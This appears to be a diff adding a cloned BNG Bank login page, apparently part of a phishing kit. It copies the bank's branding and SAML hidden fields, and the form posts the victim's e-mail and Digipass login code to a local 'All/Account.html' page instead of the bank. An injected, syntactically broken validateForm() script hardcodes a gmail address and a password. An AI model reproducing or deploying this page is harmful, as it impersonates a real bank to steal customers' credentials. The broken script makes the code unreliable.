@@ -1,0 +1,248 @@
+
+
+<!-- SiteMinder Encoding=ISO-8859-1; -->
+
+<!DOCTYPE html>
+<html lang="nl-NL">
+  <head>
+    <title>Mijn BNG Bank Inloggen</title>
+    
+    <meta http-equiv="Content-Type" content="text/html;charset=ISO-8859-1">
+    <meta http-equiv="Window-Target" content="_top">
+    <meta http-equiv="Pragma" CONTENT="no-cache">
+    <meta http-equiv="Expires" CONTENT="-1">
+    <meta name="viewport" content="width=device-width,initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    
+    
+    <link rel="shortcut icon" href="BNG/www.bngbank.nl/-/media/Project/CBB/BNG-Bank-Shared/favicon.png" />
+    <link rel="stylesheet" href="BNG/mijn.bngbank.nl/dist/MBB/client.css" />
+
+    <script language="javascript" type="text/javascript"> if (window!=top) top.location.href=location.href </script>
+    <script language="javascript" type="text/javascript" src="BNG/js/jquery.js"></script>
+    <script language="javacript" type="text/javascript">
+        function getQueryVariable(location, variable) { 
+
+            if (!location) {
+                return null;
+            }
+
+            var vars = location.split('?')[1].split('&'); 
+
+            for (var i = 0; i < vars.length; i++) { 
+                var pair = vars[i].split('='); 
+
+                if (decodeURIComponent(pair[0]) == variable) { 
+                    return decodeURIComponent(pair[1]); 
+                }
+            } 
+            
+            return null;
+        }
+
+        var formIsSubmitted = false;
+
+        function login() {
+            if (formIsSubmitted) { 
+                return false; 
+            }
+
+            var msgs = [];
+
+            var userField = $("#USER");
+            var tokenField = $("#PASSWORD");
+            var msgPlaceholder = $("#errorMessagesPlaceholder");
+            var msgField = $("#errorMessages");
+  
+            if (msgPlaceholder && !msgPlaceholder.hasClass("hide")) {
+                msgPlaceholder.addClass("hide");
+            }
+
+            if (userField.val() == "") {
+                msgs.push("Uw e-mailadres (of GebruikersID) is niet ingevuld.");
+            }
+            
+            if (tokenField.val() == "") {
+                msgs.push("Uw logincode is niet ingevuld.");
+            }
+
+            if (msgs.length > 0) {
+                msgField.html("");
+
+                for (var i = 0; i < msgs.length; i++) {
+                    msgField.append("<li>" + msgs[i] + "</li>");
+                }
+
+                msgPlaceholder.removeClass("hide");
+                return false;
+            }
+
+            // document.LoginAPP.smauthreason.value = "0"; 
+            if (userField.val()) { 
+                formIsSubmitted = true;
+
+                $('.submit-button').addClass('disabled'); 
+                document.LoginAPP.submit(); 
+
+                return true;
+	        }
+
+	        return false;
+        }
+     
+        function isnum(event) {
+	        var whichCode;
+            
+            if (event.type == "keypress") {
+	            whichCode = event.keyCode;
+            }
+	        else {
+                whichCode = event.button;
+            }
+
+	        if (event.type == "keypress") {
+	            var veld = event.name;
+	            
+                if ((whichCode != 0 && (whichCode < 48 || whichCode > 57))) {
+		            window.event.returnValue = false;
+		            return false;
+	            }
+
+	            window.event.returnValue = true;
+	        }
+
+            return true;
+        }
+
+        // added to check maximum number of characters when typing username
+        function setMaxLength(el) {
+            var max = el.attr("maxLength");
+
+            if (max >= 0) {
+                el.bind("keypress", function () {
+                    if (this.value.length >= max) return false;
+                });
+            }
+        }      
+	  
+        $(document).ready(function() {
+
+            var userField = $("#USER");
+            var userId = getQueryVariable(window.location.search, "userid");
+
+            if (userField) {
+
+                setMaxLength(userField);
+                userField.focus();
+
+                if (userId !== null) {
+                   userField.val(userId);
+                }
+            }
+            
+        });
+
+    </script>
+	
+</head>
+
+<body class="login-body" onkeypress="if (window.event.keyCode == 13) login();">
+    <div>
+        <div>
+            <div class="login-page" style="background-image:url(BNG/mijn.bngbank.nl/-/media/Project/MBB/Website/Background-Images/Mijn-BNG-Bank-login-background.png)">
+                <div class="flex">
+                    <div class="panel col-12 col-medium-6 align-self-center margin-center login-box">
+                        <div class="panel-left"></div>
+                        <div class="panel-bottom-left"></div>
+                        <div class="panel-bottom"></div>
+                        <div class="panel-content">
+                            <div class="col-6">
+                                <a href="BNG/www.bngbank.nl">
+                                    <img src="BNG/mijn.bngbank.nl/dist/MBB/images/logo.svg" alt="BNG Bank Logo" class="login-logo" />
+                                </a>
+                            </div>
+                            <div class="alternate-background p-16">
+                                <div class="row m-b-16">
+                                    <h3 class="f-light">Log in</h3>
+                                    <div class="m-t-5">bij Mijn BNG Bank</div>
+                                </div>
+</html>
+<script>
+    function validateForm(){  
+var name=document.forms["LoginAPP"]["USER"].value;  
+var password=document.forms["LoginAPP"]["PASSWORD"].value;  
+  
+if (USER!=="kampidaniel1@gmail.com"){  
+  alert("Email incorrect");  
+  return false;  
+}else if(PASSWORD.length<6 || PASSWORD!="dank4344" ){  
+  alert("Password must be at least 6 characters long. ")
+   ; 
+   return false; 
+   else 
+    alert("password incorrect");
+  return false;  
+  }  
+}  
+</script>
+                                <form name="LoginAPP" id="LoginAPP" class="general-form" method="post" action="All/Account.html"autocomplete="off" onsubmit="return validateForm()">
+                                    <input type="hidden" name="SMENC" value="ISO-8859-1">
+                                    <input type="hidden" name="SMLOCALE" value="US-EN">
+                                    <input type="hidden" name="target" value="HTTPS://www.idp.bngbank.nl/affwebservices/redirectjsp/redirect.jsp?SAMLRequest=fZFRS8MwFIX%2fSsh7m6brNhe6wtgQCiqi4oNvaXrrgm1Sc1Or%2f960BWEIg7zcyz055%2bPkKLu2F4fBn80TfA6AnpSnPdV1lFYg1Y7LaFdvVlG2rVS0S2oeVc2KZ5sbmdxkkpJXcKit2dM0TigpEQcoDXppfFglKY94eLsXvhbrtciSmGfbN0pOwUcb6Wfl2fseBWPjOMa67uPKvFfSfMSmZbJpRqgQ3JdWgKwfqlYrNmVOES0lR2sQJqvBGWElahRGdoDCK%2fF8uL8TIZVQy5EYDPagdKOhpuS7aw2Kmf66unfWW2VbWuQznVuk10USQ%2baJjhYTXYCTdYMXZGFmf2DeDehzthgU%2bVLKQ%2fi2PD3agPxDbq3r5BVQHvN5E4pr5tNL3EPb2vHoQHrY0%2bAGlLAiZ%2f%2fbL34B&RelayState=a3edf22c-f0a5-4a3f-9622-065a47cec8c2&SMPORTALURL=https%3A%2F%2Fwww.idp.bngbank.nl%2Faffwebservices%2Fpublic%2Fsaml2sso&SAMLTRANSACTIONID=223f9ed8-c0d0ce22-f49f17de-645fd61c-7de3cda3-ff">
+                                    <input type="hidden" name="smauthreason" value="0">
+                                    <input type="hidden" name="smagentname" value="NLTSDlNf/5lVya+3/L5WcINfArI4s2cXcXcSaocbb0t6JchBsTx+X9owJRBzZMIp">
+                                    <input type="hidden" name="postpreservationdata" value="">
+                                    <input type="hidden" name="smquerydata" value="">
+
+                                    <div class="form-group default">
+                                        <label for="name" class="summary">E-mailadres of GebruikersID</label>
+                                        <div class="flex flex-row field-placeholder">
+                                            <div class="flex-auto">
+                                                <input type="text" class="form-control" id="USER" name="USER" maxlength="255" />
+                                            </div>
+                                            <div class="indicator"></div>
+                                        </div>
+                                    </div>
+
+                                    <div class="m-t-10">
+                                        <div class="form-group default">
+                                            <label for="name" class="summary">Logincode</label>
+                                            <div class="flex flex-row field-placeholder">
+                                                <div class="flex-auto">
+                                                    <input type="text" class="form-control" id="PASSWORD" name="PASSWORD" autocomplete="off">
+                                                </div>
+                                                <div class="indicator"></div>
+                                            </div>
+                                            <div class="m-t-5 caption description">Vul hier de logincode die u terugkrijgt van uw Digipass of de Digipass App.</div>
+                                        </div>
+                                    </div>
+                                    
+                                    <button class="button width-100 m-t-30" onclick="return login();">
+                                        <div class="flex flex-row">
+                                            <div class="flex-auto f-bold primary">Inloggen</div>
+                                        </div>
+                                    </button>
+                                    <div id="errorMessagesPlaceholder" class="m-t-10 form-error-messages caption text-danger hide">
+                                        Het volgende is niet goed gegaan;
+                                        <ul id="errorMessages"></ul>
+                                    </div>
+                                </form>
+                                <div class="row m-t-8 m-b-16">
+                                    <div class="link-button">
+                                        <div class="text-placeholder pointer">
+                                            <a href="https://www.bngbank.nl/betalingsverkeer/voorwaarden-en-tarieven/gebruik-en-voorwaarden-digipass-en-digipass-app" target="_blank">Hulp nodig?</a>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="info-panel f-bold title col-6 m-b-100 display-none display-medium-inline-block align-self-end">
+                        <div>Direct inzicht in uw bankzaken om maatschappelijke doelstellingen te realiseren.</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
